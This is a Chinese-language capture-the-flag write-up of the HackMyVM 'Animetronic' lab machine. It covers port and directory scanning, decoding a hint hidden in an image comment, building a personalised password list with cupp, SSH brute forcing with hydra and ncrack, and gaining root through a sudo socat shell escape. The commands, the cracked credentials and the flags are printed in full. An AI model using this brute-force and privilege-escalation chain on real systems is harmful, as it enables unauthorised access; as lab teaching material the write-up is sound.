---
title: Animetronic
author: hgbe02
date: 2024-04-03
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/Animetronic.html"
---

# Animetronic

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404031947772.png" alt="image-20240403151754014" style="zoom: 50%;" />

## 信息搜集

### 端口扫描

```bash
nmap -sCV 172.20.10.5
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 59:eb:51:67:e5:6a:9e:c1:4c:4e:c5:da:cd:ab:4c:eb (ECDSA)
|_  256 96:da:61:17:e2:23:ca:70:19:b5:3f:53:b5:5a:02:59 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Animetronic
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 目录爆破

```bash
feroxbuster -u http://172.20.10.5
```

```css
301      GET        9l       28w      307c http://172.20.10.5/js => http://172.20.10.5/js/
200      GET       52l      340w    24172c http://172.20.10.5/img/favicon.ico
200      GET       42l       81w      781c http://172.20.10.5/css/animetronic.css
200      GET        7l     1513w   144878c http://172.20.10.5/css/bootstrap.min.css
301      GET        9l       28w      308c http://172.20.10.5/css => http://172.20.10.5/css/
301      GET        9l       28w      308c http://172.20.10.5/img => http://172.20.10.5/img/
200      GET     2761l    15370w  1300870c http://172.20.10.5/img/logo.png
200      GET       52l      202w     2384c http://172.20.10.5/
```

以防万一，换一个字典扫一下，这个默认字典有的时候很容易漏掉东西：

```bash
feroxbuster -u http://172.20.10.5/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

果然，漏掉东西了。。。。

```css
200      GET        7l     1513w   144878c http://172.20.10.5/css/bootstrap.min.css
200      GET       52l      340w    24172c http://172.20.10.5/img/favicon.ico
301      GET        9l       28w      308c http://172.20.10.5/css => http://172.20.10.5/css/
301      GET        9l       28w      307c http://172.20.10.5/js => http://172.20.10.5/js/
301      GET        9l       28w      308c http://172.20.10.5/img => http://172.20.10.5/img/
200      GET     2761l    15370w  1300870c http://172.20.10.5/img/logo.png
200      GET       42l       81w      781c http://172.20.10.5/css/animetronic.css
200      GET       52l      202w     2384c http://172.20.10.5/
301      GET        9l       28w      315c http://172.20.10.5/staffpages => http://172.20.10.5/staffpages/
200      GET      728l     3824w   287818c http://172.20.10.5/staffpages/new_employees
```

## 漏洞挖掘

### 查看敏感目录

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404031947774.png" alt="image-20240403152606719" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404031947775.png" alt="image-20240403152619033" style="zoom:33%;" />

```apl
http://172.20.10.5/staffpages/
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404031947776.png" alt="image-20240403152709630" style="zoom:33%;" />

```apl
http://172.20.10.5/staffpages/new_employees
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404031947777.png" alt="image-20240403152753488" style="zoom:50%;" />

好家伙，玩具熊，是一张图片，请求过来。

### 图片隐写

```bash
wget http://172.20.10.5/staffpages/new_employees
```

```bash
┌──(kali💀kali)-[~/temp/Animetronic]
└─$ steghide extract -sf new_employees  
Enter passphrase: 
                                                                                                                                                            
┌──(kali💀kali)-[~/temp/Animetronic]
└─$ stegseek -wl /usr/share/wordlists/rockyou.txt new_employees 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Progress: 99.74% (133.1 MB)           
[!] error: Could not find a valid passphrase.
```

可以看到确实有隐藏信息，但是我们没有爆破出来：

尝试直接file一下：

```bash
file new_employees             
new_employees: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, comment: "page for you michael : ya/HnXNzyZDGg8ed4oC+yZ9vybnigL7Jr8SxyZTJpcmQx53Xnwo=", progressive, precision 8, 703x1136, components 3
```

找到隐藏信息，很明显是base64，解码一下：

```bash
echo 'ya/HnXNzyZDGg8ed4oC+yZ9vybnigL7Jr8SxyZTJpcmQx53Xnwo=' | base64 -d
ɯǝssɐƃǝ‾ɟoɹ‾ɯıɔɥɐǝ
```

倒过来再翻转一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404031947778.png" alt="image-20240403153704311" style="zoom: 33%;" />

```apl
message_for_m1chae
```

尝试访问发现错误，更改一下：

```apl
message_for_m1chae + page for you michael -> message_for_michael
```

```text
Hi Michael

Sorry for this complicated way of sending messages between us.
This is because I assigned a powerful hacker to try to hack
our server.

By the way, try changing your password because it is easy
to discover, as it is a mixture of your personal information
contained in this file 

personal_info.txt
```

查看一下这个文件：

```text
name: Michael
age: 27
birth date: 19/10/1996
number of children: 3 " Ahmed - Yasser - Adam "
Hobbies: swimming 
```

生成社工字典进行爆破，尝试使用cupp：

```bash
┌──(kali💀kali)-[~/cupp]
└─$ python3 cupp.py -i
 ___________ 
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\   
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]

[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: Michael
> Surname: 
> Nickname: 
> Birthdate (DDMMYYYY): 19101996          

> Partners) name: 
> Partners) nickname: 
> Partners) birthdate (DDMMYYYY): 

> Child's name: Ahmed
> Child's nickname: 
> Child's birthdate (DDMMYYYY): 

> Pet's name: 
> Company name: 

> Do you want to add some key words about the victim? Y/[N]: Y
> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: 27 Yasser Adam swimming
> Do you want to add special chars at the end of words? Y/[N]: Y
> Do you want to add some random numbers at the end of words? Y/[N]:Y
> Leet mode? (i.e. leet = 1337) Y/[N]: 

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to michael.txt, counting 3984 words.
> Hyperspeed Print? (Y/n) : n
[+] Now load your pistolero with michael.txt and shoot! Good luck!
```

然后尝试进行爆破：

```bash
hydra -l Michael -P michael.txt ssh://172.20.10.5
```

```bash
┌──(kali💀kali)-[~/cupp]
└─$ hydra -l michael -P michael.txt ssh://172.20.10.5      
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-03 06:50:13
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 3984 login tries (l:1/p:3984), ~249 tries per task
[DATA] attacking ssh://172.20.10.5:22/
[STATUS] 114.00 tries/min, 114 tries in 00:01h, 3872 to do in 00:34h, 14 active
[STATUS] 98.67 tries/min, 296 tries in 00:03h, 3690 to do in 00:38h, 14 active
[STATUS] 92.29 tries/min, 646 tries in 00:07h, 3340 to do in 00:37h, 14 active
[STATUS] 89.73 tries/min, 1346 tries in 00:15h, 2640 to do in 00:30h, 14 active
[STATUS] 86.68 tries/min, 2687 tries in 00:31h, 1300 to do in 00:15h, 13 active
[STATUS] 85.89 tries/min, 3092 tries in 00:36h, 895 to do in 00:11h, 13 active
[22][ssh] host: 172.20.10.5   login: michael   password: leahcim1996
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-04-03 07:30:22
```

爆破出来了一个密码：

```apl
michael
leahcim1996
```

### ssh连接

```bash
ssh michael@172.20.10.5
leahcim1996
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404031947779.png" alt="image-20240403184234499" style="zoom: 50%;" />

## 提权

### 信息搜集

```bash
michael@animetronic:~$ whoami;id
michael
uid=1001(michael) gid=1001(michael) groups=1001(michael)
michael@animetronic:~$ sudo -l
[sudo] password for michael: 
Sorry, user michael may not run sudo on animetronic.
michael@animetronic:/home/henry$ find / -perm -u=s -type f 2>/dev/null
/usr/libexec/polkit-agent-helper-1
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/mount
/usr/bin/pkexec
/usr/bin/su
/usr/bin/fusermount3
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
michael@animetronic:~$ pwd
/home/michael
michael@animetronic:~$ ls -la
total 28
drwxr-x--- 3 michael michael 4096 Nov 27 21:03 .
drwxr-xr-x 4 root    root    4096 Nov 27 18:10 ..
-rw------- 1 michael michael    5 Nov 27 21:03 .bash_history
-rw-r--r-- 1 michael michael  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 michael michael 3771 Jan  6  2022 .bashrc
drwx------ 2 michael michael 4096 Nov 27 18:50 .cache
-rw-r--r-- 1 michael michael  807 Jan  6  2022 .profile
michael@animetronic:~$ cat .bash_history 
exit
michael@animetronic:~$ cd ..;ls -la
total 16
drwxr-xr-x  4 root    root    4096 Nov 27 18:10 .
drwxr-xr-x 19 root    root    4096 Nov 27 09:54 ..
drwxrwxr-x  6 henry   henry   4096 Nov 27 20:59 henry
drwxr-x---  3 michael michael 4096 Nov 27 21:03 michael
michael@animetronic:/home$ cd henry/
michael@animetronic:/home/henry$ ls -la
total 56
drwxrwxr-x   6 henry henry  4096 Nov 27 20:59 .
drwxr-xr-x   4 root  root   4096 Nov 27 18:10 ..
-rwxrwxr-x   1 henry henry    30 Jan  5 10:08 .bash_history
-rwxrwxr-x   1 henry henry   220 Jan  6  2022 .bash_logout
-rwxrwxr-x   1 henry henry  3771 Jan  6  2022 .bashrc
drwxrwxr-x   2 henry henry  4096 Nov 27 10:08 .cache
drwxrwxr-x   3 henry henry  4096 Nov 27 10:42 .local
drwxrwxr-x 402 henry henry 12288 Nov 27 18:23 .new_folder
-rwxrwxr-x   1 henry henry   807 Jan  6  2022 .profile
drwxrwxr-x   2 henry henry  4096 Nov 27 10:04 .ssh
-rwxrwxr-x   1 henry henry     0 Nov 27 18:26 .sudo_as_admin_successful
-rwxrwxr-x   1 henry henry   119 Nov 27 18:18 Note.txt
-rwxrwxr-x   1 henry henry    33 Nov 27 18:20 user.txt
michael@animetronic:/home/henry$ cat user.txt 
0833990328464efff1de6cd93067cfb7
michael@animetronic:/home/henry$ cat Note.txt 
if you need my account to do anything on the server,
you will find my password in file named

aGVucnlwYXNzd29yZC50eHQK
```

### 找敏感文件

```bash
find / -name aGVucnlwYXNzd29yZC50eHQK -type f 2>/dev/null
```

没有发现，进行base64解码：

```bash
echo "aGVucnlwYXNzd29yZC50eHQK" | base64 -d
henrypassword.txt
find / -name henrypassword.txt -type f 2>/dev/null
/home/henry/.new_folder/dir289/dir26/dir10/henrypassword.txt
```

看一下文件内容：

```apl
IHateWilliam
```

### 切换henry用户

它的名字显示这是`henry`的密码，看一下是否有这个用户：

```bash
michael@animetronic:/home/henry$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
henry:x:1000:1000:Hanry:/home/henry:/bin/bash
mysql:x:108:113:MySQL Server,,,:/nonexistent:/bin/false
michael:x:1001:1001::/home/michael:/usr/bin/bas
```

有的，尝试切换用户：

```bash
michael@animetronic:/home/henry$ su henry
Password: 
henry@animetronic:~$ whoami;id
henry
uid=1000(henry) gid=1000(henry) groups=1000(henry),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)
```

### 信息搜集

```bash
henry@animetronic:~$ sudo -l
Matching Defaults entries for henry on animetronic:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User henry may run the following commands on animetronic:
    (root) NOPASSWD: /usr/bin/socat
```

尝试进行提权：https://gtfobins.github.io/gtfobins/socat/

```bash
sudo socat stdin exec:/bin/bash
```

```bash
henry@animetronic:~$ sudo socat stdin exec:/bin/bash
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
root.txt
cat root.txt
153a1b940365f46ebed28d74f142530f280a2c0a
```

## 额外收获

### 图片隐写

可以使用

```bash
exiftool 文件路径
```

查看图片的隐藏信息。

### 爆破

巨魔师傅使用 ncrack 进行爆破，学习一下：

```bash
ncrack -T5 -v -u michael -P michael.txt ssh://172.20.10.5
```

```text
Starting Ncrack 0.7 ( http://ncrack.org ) at 2024-04-03 07:04 EDT
Discovered credentials on ssh://172.20.10.5:22 'michael' 'leahcim1996'
Discovered credentials for ssh on 172.20.10.5 22/tcp:
172.20.10.5 22/tcp ssh: 'michael' 'leahcim1996'

Ncrack done: 1 service scanned in 666.24 seconds.
Probes sent: 1141 | timed-out: 0 | prematurely-closed: 468

Ncrack finished.
```

确实比`hydra`快多了